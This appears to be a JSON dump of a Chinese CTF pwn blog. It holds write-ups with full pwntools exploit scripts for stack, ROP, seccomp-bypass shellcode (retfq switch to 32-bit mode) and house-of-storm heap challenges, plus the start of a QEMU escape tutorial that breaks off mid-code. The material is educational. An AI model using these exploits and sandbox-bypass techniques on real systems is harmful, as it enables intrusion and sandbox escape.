((i++) * 8)) = user_ss;    write(fd, buf, 0xe0);    pthread_join(thr[0], NULL);    read(fd, buf, 0x200);    return 0;&#125;\n\n总结这周四道题目难度不算是很大，不过那个easy printf我确实没什么思路，有兴趣的师傅可以去看一下（然后可怜我告诉我一下）。\n","categories":["pwn"],"tags":["Double Fetch","pt_regs","tty_struct","fastbin"]},{"title":"practice Ⅰ","url":"/2022/10/16/practice%E2%85%A0/","content":"练题笔记已经学了一段时间内核了，感觉自己在基础知识方面比较欠缺，所以打算回过头去看一下相关书籍深入学习一下基础知识，在学习途中保持pwn题训练。\neasy stack题目分析题目逻辑很简单\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[128]; // [rsp+0h] [rbp-80h] BYREF  alarm(0x3Cu);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  read_n(s, 0x100LL);  puts(s);  return 0;&#125;\n\nvoid *__fastcall read_n(void *a1, unsigned __int64 a2)&#123;  int v2; // eax  char s[520]; // [rsp+10h] [rbp-210h] BYREF  int v5; // [rsp+218h] [rbp-8h]  int v6; // [rsp+21Ch] [rbp-4h]  v6 = 0;  if ( a2 &gt; 0x200 )  &#123;    puts(&quot;too long!&quot;);    exit(-1);  &#125;  do  &#123;    read(0, &amp;s[v6], 1uLL);    if ( s[v6] == 10 )      break;    if ( !s[v6] )      break;    v2 = v6++;  &#125;  while ( a2 &gt; v2 );  if ( s[v6] == 10 &amp;&amp; a2 &gt; v6 )    s[v6] = 0;  v5 = strlen(s);  return memcpy(a1, s, v5);&#125;\n\n可以看到存在明显的栈溢出漏洞。不过比较棘手的是程序开启了PIE导致我们无法多次利用此漏洞，所以我们目前来看迫切需要的就是重复多次扩大漏洞。\n在栈方面比较熟知扩大漏洞的方法是fini_array劫持，不过这里不存在任意写所以无法实现。\n漏洞分析.text:00000000000007C0                               public _start.text:00000000000007C0                               _start proc near                        ; DATA XREF: LOAD:0000000000000018↑o.text:00000000000007C0                               ; __unwind &#123;.text:00000000000007C0 31 ED                         xor     ebp, ebp.text:00000000000007C2 49 89 D1                      mov     r9, rdx                         ; rtld_fini.text:00000000000007C5 5E                            pop     rsi                             ; argc.text:00000000000007C6 48 89 E2                      mov     rdx, rsp                        ; ubp_av.text:00000000000007C9 48 83 E4 F0                   and     rsp, 0FFFFFFFFFFFFFFF0h.text:00000000000007CD 50                            push    rax.text:00000000000007CE 54                            push    rsp                             ; stack_end.text:00000000000007CF 4C 8D 05 FA 02 00 00          lea     r8, __libc_csu_fini             ; fini.text:00000000000007D6 48 8D 0D 83 02 00 00          lea     rcx, __libc_csu_init            ; init.text:00000000000007DD 48 8D 3D E0 01 00 00          lea     rdi, main                       ; main.text:00000000000007E4 FF 15 F6 07 20 00             call    cs:__libc_start_main_ptr.text:00000000000007E4.text:00000000000007EA F4                            hlt.text:00000000000007EA                               ; &#125; // starts at 7C0.text:00000000000007EA.text:00000000000007EA                               _start endp\n\n总所周知，程序的入口是_start函数，并且我们知道这里的执行顺序是__libc_csu_init=&gt;main=&gt;__libc_csu_fini\n\n可以看到在进入函数不过多久就开始调用了_libc_csu_init，并且把main地址放在了rsp+0x18位置\n.text:0000000000021A35                 lea     rdi, [rsp+0B8h+var_98] ; env.text:0000000000021A3A                 call    _setjmp.text:0000000000021A3F                 test    eax, eax.text:0000000000021A41                 jnz     short loc_21A8E.text:0000000000021A43                 mov     rax, fs:300h.text:0000000000021A4C                 mov     [rsp+0B8h+var_50], rax.text:0000000000021A51                 mov     rax, fs:2F8h.text:0000000000021A5A                 mov     [rsp+0B8h+var_48], rax.text:0000000000021A5F                 lea     rax, [rsp+0B8h+var_98].text:0000000000021A64                 mov     fs:300h, rax.text:0000000000021A6D                 mov     rax, cs:environ_ptr.text:0000000000021A74                 mov     rsi, [rsp+8].text:0000000000021A79                 mov     edi, [rsp+14h].text:0000000000021A7D                 mov     rdx, [rax].text:0000000000021A80                 mov     rax, [rsp+18h].text:0000000000021A85                 call    rax\n\n\n随后调用main函数，然后从main函数返回时的ret地址自然而然成了call的下一行。所以如果我们可以覆盖末尾字节为0x80即可重新进入main函数达到扩大漏洞的效果。\n综上，expfrom pwn import *elf = ELF(&#x27;./easy_stack&#x27;)# r = process(&#x27;./easy_stack&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10004)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;payload = b&#x27;a&#x27;*0x88+p16(0x80)r.send(payload)r.recvuntil(b&#x27;a&#x27;*0x88)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x21A80print(hex(libc_base))payload = b&#x27;a&#x27;*0x88 + flat(libc_base+0x415a6)r.sendline(payload)r.interactive()\n\nno leak题目分析这里吐槽一下这个平台，给的libc不是常见libc，并且也不给ld文件，上面一道可以泄漏还好这个无法泄漏只能爆破偏移，太浪费时间了，基本就是盲调。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  alarm(0x3Cu);  read(0, buf, 0x100uLL);  return 0;&#125;\n\n题目很简单，就只有简单的栈溢出，并且不存在任何的输出函数。\n\n这里还有一个吐槽点，因为程序保护是Full RELRO所以走ret2resolve是行不通的，所以下意识就是去找gadget。这里的吐槽点就是在ida和ROPgadget里面都找到有用的gadget是在ropper导出的内容才找到：\n0000000000400518: add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret\n\n这里依旧需要熟知程序的运行机制，在上面一道题中我们提到了，程序开始时_start=&gt;__libc_start_main=&gt;main，在最后这里进入main时是用call进入的，所以会在栈上残留下__libc_start_main+231的地址，不过这里因为我们要持续劫持执行流所以我们不能利用这里，不过这里依旧存在很多可以用的，这里就不再赘述，可以自己看一下__libc_start_main的函数代码。\n利用分析看得出来上面的gadget是可以修改任意地址上内容的值，所以如果我们在已知地址上放上libc地址即可根据偏移得到system的地址，最后通过csu来call已知位置即可。\n最后得出的思路就是：\n栈迁移到bss段=&gt;在bss布置rop进行csu调用__libc_start_main=&gt;在__libc_start_main中调用read覆盖栈=&gt;使用gadget修改残留位置指向system并用csu调用\n综上，expfrom pwn import *elf = ELF(&#x27;./no_leak&#x27;)# r = process(&#x27;./no_leak&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10002)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]bss = elf.bss()+0x500main = elf.sym[&#x27;main&#x27;]_start = 0x400474pop_rdi = 0x00000000004005d3pop_rsi_r15 = 0x00000000004005d1# add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; retgadget = 0x0000000000400518pop_rbp = 0x00000000004004b8pop_rbx_rbp_r12_r13_r14_r15 = 0x4005CAone_gadget = 0x41720# gdb.attach(r, &#x27;b*&#x27;+hex(elf.plt[&#x27;read&#x27;]))payload = b&#x27;a&#x27;*0x80+flat(bss, pop_rdi, 0, pop_rsi_r15,                         bss, 0, elf.plt[&#x27;read&#x27;], 0x400564)r.sendline(payload)payload = flat(0x196082, 0x4005CA, (one_gadget-0x21a87)-1, (one_gadget-0x21a87),               (0x601558 - (((one_gadget-0x21a87)-1)*8)), elf.symbols[&#x27;read&#x27;], 0, 0x601488, 0x4005B0, _start)sleep(1)r.sendline(payload)sleep(1)bin_sh_addr = 0x601488+0x90+8payload = flat(pop_rbx_rbp_r12_r13_r14_r15,               -0x371f08, [0]*5, pop_rbp, 0x601448+0x3d, gadget, 0x4005CA, 0, 1, 0x601448, bin_sh_addr, 0, 0, 0x0000000000400416, 0x4005B0)payload += b&#x27;/bin/sh\\x00&#x27;r.sendline(payload)# r.sendline(p64(main))r.interactive()\n\nshellcode在以往遇到沙箱的问题都是使用ORW，并且只是常规的进行调用，并没有更加深层次的讨论。这里就借此题目更加深入讨论一下在CTF中常见的沙箱保护以及绕过方式。\n题目分析void __noreturn start()&#123;  signed __int64 v0; // rax  signed __int64 v1; // rax  signed __int64 v2; // rax  unsigned __int64 v3; // r10  signed __int64 v4; // rax  char *v5; // rbx  signed __int64 v6; // rax  signed __int64 v7; // rax  int v8; // r12d  int i; // r13d  signed __int64 v10; // rax  signed __int64 v11; // rax  unsigned __int64 arg3[2]; // [rsp+80h] [rbp-80h] BYREF  __int16 v13; // [rsp+90h] [rbp-70h] BYREF  char v14; // [rsp+92h] [rbp-6Eh]  char v15; // [rsp+93h] [rbp-6Dh]  int v16; // [rsp+94h] [rbp-6Ch]  __int16 v17; // [rsp+98h] [rbp-68h]  char v18; // [rsp+9Ah] [rbp-66h]  char v19; // [rsp+9Bh] [rbp-65h]  int v20; // [rsp+9Ch] [rbp-64h]  __int16 v21; // [rsp+A0h] [rbp-60h]  char v22; // [rsp+A2h] [rbp-5Eh]  char v23; // [rsp+A3h] [rbp-5Dh]  int v24; // [rsp+A4h] [rbp-5Ch]  __int16 v25; // [rsp+A8h] [rbp-58h]  char v26; // [rsp+AAh] [rbp-56h]  char v27; // [rsp+ABh] [rbp-55h]  int v28; // [rsp+ACh] [rbp-54h]  __int16 v29; // [rsp+B0h] [rbp-50h]  char v30; // [rsp+B2h] [rbp-4Eh]  char v31; // [rsp+B3h] [rbp-4Dh]  int v32; // [rsp+B4h] [rbp-4Ch]  __int16 v33; // [rsp+B8h] [rbp-48h]  char v34; // [rsp+BAh] [rbp-46h]  char v35; // [rsp+BBh] [rbp-45h]  int v36; // [rsp+BCh] [rbp-44h]  __int16 v37; // [rsp+C0h] [rbp-40h]  char v38; // [rsp+C2h] [rbp-3Eh]  char v39; // [rsp+C3h] [rbp-3Dh]  int v40; // [rsp+C4h] [rbp-3Ch]  __int16 v41; // [rsp+C8h] [rbp-38h]  char v42; // [rsp+CAh] [rbp-36h]  char v43; // [rsp+CBh] [rbp-35h]  int v44; // [rsp+CCh] [rbp-34h]  __int16 v45; // [rsp+D0h] [rbp-30h]  char v46; // [rsp+D2h] [rbp-2Eh]  char v47; // [rsp+D3h] [rbp-2Dh]  int v48; // [rsp+D4h] [rbp-2Ch]  v13 = 32;  v14 = 0;  v15 = 0;  v16 = 0;  v17 = 21;  v18 = 6;  v19 = 0;  v20 = 5;  v21 = 21;  v22 = 5;  v23 = 0;  v24 = 37;  v25 = 21;  v26 = 4;  v27 = 0;  v28 = 1;  v29 = 21;  v30 = 3;  v31 = 0;  v32 = 0;  v33 = 21;  v34 = 2;  v35 = 0;  v36 = 9;  v37 = 21;  v38 = 1;  v39 = 0;  v40 = 231;  v41 = 6;  v42 = 0;  v43 = 0;  v44 = 0;  v45 = 6;  v46 = 0;  v47 = 0;  v48 = 2147418112;  LOWORD(arg3[0]) = 9;  arg3[1] = (unsigned __int64)&amp;v13;  v0 = sys_alarm(0x3Cu);  v1 = sys_write(1u, &quot;---------- Shellcode ----------\\n&quot;, 0x20uLL);  v2 = sys_prctl(38, 1uLL, 0LL, 0LL);  v4 = sys_prctl(22, 2uLL, (unsigned __int64)arg3, v3);  v5 = (char *)sys_mmap(0LL, 0x1000uLL, 7uLL, 0x22uLL, 0xFFFFFFFFuLL, 0LL);  v6 = sys_write(1u, &quot;Input your shellcode: &quot;, 0x16uLL);  v7 = sys_read(0, v5, 0x1000uLL);  v8 = v7;  if ( v5[(int)v7 - 1] == 10 )  &#123;    v5[(int)v7 - 1] = 0;    v8 = v7 - 1;  &#125;  for ( i = 0; i &lt; v8; ++i )  &#123;    if ( v5[i] &lt;= 0x1F || v5[i] == 0x7F )    &#123;      v10 = sys_write(1u, &quot;Check!\\n&quot;, 7uLL);      goto LABEL_10;    &#125;  &#125;  ((void (*)(void))v5)();LABEL_10:  v11 = sys_exit_group(0);&#125;\n\n题目很简单，限制了输入的shellcode为可见字符，这里虽然ida翻译为了if ( v5[i] &lt;= 0x1F || v5[i] == 0x7F )不过在实际调试过程中发现就是不允许大于0x7f，上面开启了sandbox。\nroot@0df3326fd7c0:/ctf/work/download # seccomp-tools dump ./shellcode---------- Shellcode ---------- line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000000  A = sys_number 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008 0003: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0008 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008 0007: 0x06 0x00 0x00 0x00000000  return KILL 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOWroot@0df3326fd7c0:/ctf/work/download #\n\n如果按照我以往的思维方式会认为这道题目是没法完成的，应为没有open调用。所以下面就讲解一下sandbox的一些利用技巧。\nsandbox绕过这里拿一个平时十分常见的沙箱规则做讲解：\n0000: 0x20 0x00 0x00 0x00000004  A = arch0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 00080002: 0x20 0x00 0x00 0x00000000  A = sys_number0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 00050004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 00080005: 0x15 0x02 0x00 0x00000003  if (A == close) goto 00080006: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 00080007: 0x06 0x00 0x00 0x7fff0000  return ALLOW0008: 0x06 0x00 0x00 0x00000000  return KILL\n\n这个沙箱规则是非常简单的，可以看到可以直接进行ORW获得flag。\n可以看到这里前面两行做了一个判断，这个判断的效果就是判断当前的架构是否为amd64，如果不是可以看到直接会被kill掉。接着下面两行是验证sys_number的需要小于0x40000000。\n下面主要讲解如果不存上述两条判断的情况，以及一种额外的绕过方式。\n0000: 0x20 0x00 0x00 0x00000000  A = sys_number0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 00080002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 00080003: 0x15 0x04 0x00 0x00000001  if (A == write) goto 00080004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 00080005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 00080006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 00080007: 0x06 0x00 0x00 0x00000000  return KILL0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n\n这里用题目的沙箱规则做讲解。可以看到这里不存在架构的判断，并且也不存在sys_number大小的判断。不过可以看出来这里不能使用sysnumber+0x40000000的方式来绕过，因为这里判断调用号都不满足时就会直接KILL掉。不过这里可以使用进入x86架构来绕过。\n首先要知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的retfq汇编指令来修改。\n然后再深扒一下retfq指令，这一指令其实存在的是两步，分别是:ret; mov cs, [rsp + 8]所以如果我们事先控制了栈上的内容即可实现切换架构。\n再看一下没有sys_number检验的沙箱规则\n0000: 0x20 0x00 0x00 0x00000004  A = arch0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 00090002: 0x20 0x00 0x00 0x00000000  A = sys_number0003: 0x15 0x05 0x00 0x00000002  if (A == open) goto 00090004: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 00090005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 00090006: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 00090007: 0x15 0x01 0x00 0x00000130  if (A == open_by_handle_at) goto 00090008: 0x06 0x00 0x00 0x7fff0000  return ALLOW0009: 0x06 0x00 0x00 0x00000000  return KILL\n\n这里是随便找的一个例子，可能不是很严谨。可以看到这里验证了架构，但是没有验证sys_number所以使用sys_number|0x40000000在下面的判断中不会被KILL掉，并且在后续执行过程中只会使用只会调用sys_number\n下面讲解一下如果上述两条都存在时我们需要调用ORW应该如何处理\n0000: 0x20 0x00 0x00 0x00000004  A = arch0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 00110002: 0x20 0x00 0x00 0x00000000  A = sys_number0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 00050004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 00110005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 00110006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 00110007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 00110008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 00110009: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 00110010: 0x06 0x00 0x00 0x7fff0000  return ALLOW0011: 0x06 0x00 0x00 0x00000000  return KILL\n\nopen系统调用实际上是调用了openat，所以直接 调用openat，然后除了 read，write，其实还有两个readv，和writev，这些就能绕过限制读取flag\n解题思路有了上述的基础就好做了，首先我们的思路就是想办法转到32位结构执行open，因为在32位的系统调用中open是5所以可以通过过滤。\n不过这里我们需要知道的是在64位架构下的栈地址，在32位架构下是无法解析的，所以我还需要利用mmap生成一个可以放进esp中的地址当作栈。\n其实有了上面的基础就很简单了，就不再赘述了直接给exp了。\n综上，expfrom pwn import *elf = ELF(&#x27;./shellcode&#x27;)# r = process(&quot;./shellcode&quot;)r = remote(&#x27;nc.eonew.cn&#x27;, 10011)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]shellcode = &#x27;&#x27;&#x27;/*mmap(0x40404040,0x7e,7,34,0,0)*/push 0x40404040pop rdipush 0x7epop rsipush 0x40pop raxxor al,0x47push raxpop rdxpush 0x40pop raxxor al,0x40push raxpop r8push raxpop r9push rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x2e],clpush 0x5fpop rcxxor byte ptr[rax+0x2f],clpush 0x40pop raxxor al,0x49push rdxpop rdx/*read(0,0x40404040,0x70)*/push 0x40404040pop rsipush 0x40pop raxxor al,0x40push raxpop rdixor al,0x40push 0x70pop rdxpush rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x54],clpush 0x5fpop rcxxor byte ptr[rax+0x55],clpush rdxpop raxxor al,0x70push rdxpop rdx/*change to x86*/push rbxpop raxxor al,0x40push 0x72pop rcxxor byte ptr[rax+0x3d],clpush 0x68pop rcxxor byte ptr[rax+0x3d],clpush 0x47pop rcxsub byte ptr[rax+0x3e],clpush 0x48pop rcxsub byte ptr[rax+0x3e],clpush rdipush rdipush 0x23push 0x40404040pop raxpush raxpush rdxpop rdx&#x27;&#x27;&#x27;# gdb.attach(r, &#x27;b*0x4002DE\\nb*0x4002EB\\nc&#x27;)payload = asm(shellcode, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)r.sendline(payload)# context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)shellcode = &#x27;&#x27;&#x27;/*open(&quot;flag&quot;)*/mov esp,0x40404140push 0x67616c66push esppop ebxxor ecx,ecxmov eax,5int 0x80mov ecx,eax&#x27;&#x27;&#x27;payload = asm(shellcode)# context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)payload += b&#x27;\\x90&#x27;*0x29payload += asm(&#x27;&#x27;&#x27;/*change to x64*/push 0x33push 0x40404089retfq/*read(fp,buf,0x70)*/mov rdi,rcxmov rsi,rspmov rdx,0x70xor rax,raxsyscall/*write(1,buf,0x70)*/mov rdi,1mov rax,1syscall&#x27;&#x27;&#x27;, arch=&#x27;amd64&#x27;)r.sendline(payload)r.interactive()\n\nHouse of Storm题目分析这道题目是十分常规的菜单类堆题，不过这里在main中做了一定处理。\nunsigned __int64 __fastcall new_environment(int a1)&#123;  int v1; // edx  int v2; // ecx  int v3; // er8  int v4; // er9  unsigned __int64 buf; // [rsp+10h] [rbp-10h]  unsigned __int64 v7; // [rsp+18h] [rbp-8h]  v7 = __readfsqword(0x28u);  old_addr = &amp;dword_0;  read(a1, &amp;buf, 8uLL);  buf = buf &gt;&gt; 32 &lt;&lt; 12;  mallopt(1, 0);  change_addr(buf, 0, v1, v2, v3, v4);  munmap(old_addr, 0x2000uLL);  munmap((char *)old_addr + 2101248, 0x2000uLL);  old_addr = 0LL;  return __readfsqword(0x28u) ^ v7;&#125;\n\nunsigned __int64 __fastcall change_addr(__int64 a1)&#123;  unsigned __int64 v1; // ST28_8  __int64 v2; // ST18_8  char *retaddr; // [rsp+38h] [rbp+8h]  v1 = __readfsqword(0x28u);  v2 = a1 - (_QWORD)old_addr;  mmap((void *)a1, 0x2000uLL, 2, 34, -1, 0LL);  memcpy((void *)a1, old_addr, 0x2000uLL);  mprotect((void *)a1, 0x2000uLL, 5);  mmap((void *)(a1 + 2101248), 0x1000uLL, 2, 34, -1, 0LL);  memcpy((void *)(a1 + 2101248), (char *)old_addr + 2101248, 0x1000uLL);  mprotect((void *)(a1 + 2101248), 0x1000uLL, 1);  mmap((void *)(a1 + 2105344), 0x1000uLL, 2, 34, -1, 0LL);  memcpy((void *)(a1 + 2105344), (char *)&amp;_data_start + (_QWORD)old_addr, 0x1000uLL);  mprotect((void *)(a1 + 2105344), 0x1000uLL, 3);  retaddr += v2;  return __readfsqword(0x28u) ^ v1;&#125;\n\n具体调试后得知这里会将process原本的基地址的内容转移到新的mmap出来的地址上去。不知道为什么如果这样干了gdb就会出现报错无法调试。不过这里只是修改process地址对我们利用没什么影响所以本地调试时可以直接patch掉。\nint delete()&#123;  signed int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Which one do you want to delete?&quot;);  v1 = get_int(&quot;Which one do you want to delete?&quot;);  if ( v1 &lt; 0 || (unsigned int)v1 &gt; 0xF || !ptr[v1] )    return puts(&quot;Error: Invalid index!\\n&quot;);  free(ptr[v1]);  return puts(&quot;Success!\\n&quot;);&#125;\n\n这里就是这道题目的漏洞点，很明显的UAF。忘了提一下，这里因为mallopt的缘故无法利用fastbin，虽然我们patch掉，但是如果用fastbin远程就打不通了。\n漏洞利用题目给的glibc版本时2.23所以我的第一反应就是通过large bin attack劫持IO_FILE的vtable然后直接执行one_gadget。\n不过实际操作会发现所有的one_gadget都不符合条件，所以我们只能另辟蹊径。\n这里我想到的是通过setcontext进行栈迁移，最后rop拿到shell。不过在puts中调用vtable时使用的寄存器为rax，这里需要有堆地址的寄存器位rdi，所以找到了一个magic gadget：\n0000000000065bca: mov rdi, rax; call qword ptr [rax + 0x20];\n\n综上，expfrom pwn import *elf = ELF(&#x27;./house_of_storm&#x27;)# r = process(&#x27;./house_of_storm&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10001)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.os = &#x27;linux&#x27;def create(size):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;What size do you want?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def delete(idx):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which one do you want to delete?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, data):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which one do you want to modify?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;What do you want to input?&#x27;)    r.send(data)def show(idx):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Which one do you want to see?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))create(0x510)create(0x100)create(0x500)create(0x100)create(0x200)create(0x100)create(0x200)create(0x100)delete(4)delete(6)show(6)r.recvline()heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0xc50print(hex(heap_base))delete(7)delete(5)delete(0)show(0)r.recvline()libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x39bb78print(hex(libc_base))pop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))system = libc_base+libc.sym[&#x27;system&#x27;]bin_sh = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))edit(1, flat(pop_rdi, bin_sh, system))create(0x600)# gdb.attach(r)edit(0, flat([libc_base+0x39bfa8]*2, 0, libc_base +     0x39c6f8-0x20, 0, libc_base+0x734f0)+b&#x27;\\n&#x27;)delete(2)# gdb.attach(r, &#x27;b*$rebase(0xC17)\\nb*&#x27;+hex(libc_base+0x45226))# gdb.attach(r, &#x27;b*$rebase(0xE10)&#x27;)edit(2, flat([libc_base+0x39bb78]*2,     [libc_base + 0x45226]*3, libc_base+0x734f0)+b&#x27;\\n&#x27;)create(0x600)# gdb.attach(r, &#x27;b*$rebase(0xE10)\\nc&#x27;)# edit(2, flat([libc_base+0x3c4b78]*2, [libc_base +#      libc.symbols[&#x27;setcontext&#x27;]+53]*3, libc_base+0x6d99a))sleep(1)r.sendline(b&#x27;3&#x27;)sleep(1)r.sendline(bytes(str(0), encoding=&#x27;utf8&#x27;))sleep(1)payload = flat([libc_base + libc.symbols[&#x27;setcontext&#x27;]+53]               * 5, libc_base+0x65bca)payload = payload.ljust(0xa0-0x10, b&#x27;a&#x27;) + \\    flat(heap_base+0x520, libc_base+0x205c2)r.send(payload)# edit(0, flat([libc_base+0x45226]*5, libc_base+0x7c990))r.interactive()\n\n小结这么多天做星盟的题会发现题目质量非常之高，需要对程序的运行，sandbox绕过机制，shellcode的熟练编写以及在堆题中找适合的gadget，有深刻的理解才可以完成解题。\n","tags":["sandbox","shellcode","__libc_start_main","house of storm"]},{"title":"qemu逃逸入门","url":"/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/","content":"首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。\n在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调试完整的计算机系统。而qemu逃逸的题目指的就是System mode这种模式，题目的形式主要是给出存在漏洞的设备然后加以利用。\nqemu的内存结构qemu使用mmap为虚拟机申请出相应大小的内存，当做虚拟机的物理内存，且这部分内存没有执行权限。\nqemu的地址转化用户虚拟地址-&gt;用户物理地址\n用户物理地址-&gt;qemu的虚拟地址空间：这里是将用户的物理地址转化为qemu使用mmap申请出来的地址空间，而这部分空间的内容与用户的物理地址一一对应。\n在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，/proc/$pid/pagemap 这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64 位的值，包含以下的数据。\n\n  Bits 0-54 page frame number (PFN) if present\n  Bits 0-4 swap type if swapped\n  Bits 5-54 swap offset if swapped\n  Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)\n  Bit 56 page exclusively mapped (since 4.2)\n  Bits 57-60 zero\n  Bit 61 page is file-page or shared-anon (since 3.5)\n  Bit 62 page swapped\n  Bit 63 page present\n\n根据以上信息，利用/proc/pid/pagemap可将虚拟地址转换为物理地址，具体步骤如下：\n1、 计算虚拟地址所在虚拟页对应的数据项在/proc/pid/pagemap中的偏移，offset=(viraddr/pagesize)*sizeof(uint64_t)\n2、 读取长度为64bits的数据项\n3、 根据Bit 63 判断物理内存页是否存在\n4、 若物理内存页已存在，则取bits 0-54作为物理页号\n5、 计算出物理页起始地址加上页内偏移即得到物理地址，phtaddr = pageframenum * pagesize + viraddr % pagesize\n对应代码如下：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;   #include &lt;stdint.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)size_t va2pa(void *addr)&#123;    uint64_t data;    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);    if (!fd)    &#123;        perror(&quot;open pagemap&quot;);        return 0;    &#125;    size_t offset = ((uintptr_t)addr / PAGE_SIZE) * sizeof(uint64_t);    if (lseek(fd, offset, SEEK_SET) &lt; 0)    &#123;        puts(&quot;lseek&quot;);        close(fd);        return 0;    &#125;    if (read(fd, &amp;data, 8) != 8)    &#123;        puts(&quot;read&quot;);        close(fd);        return 0;    &#125;    if (!(data &amp; (((uint64_t)1 &lt;&lt; 63))))    &#123;        puts(&quot;page&quot;);        close(fd);        return 0;    &#125;    size_t pageframenum = data &amp; ((1ull &lt;&lt; 55) - 1);    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;    close(fd);    return phyaddr;&#125;int main()&#123;    char *userbuf;    uint64_t userbuf_pa;    unsigned char* mmio_mem;    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)&#123;        perror(&quot;open mmio&quot;);        exit(-1);    &#125;    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)&#123;        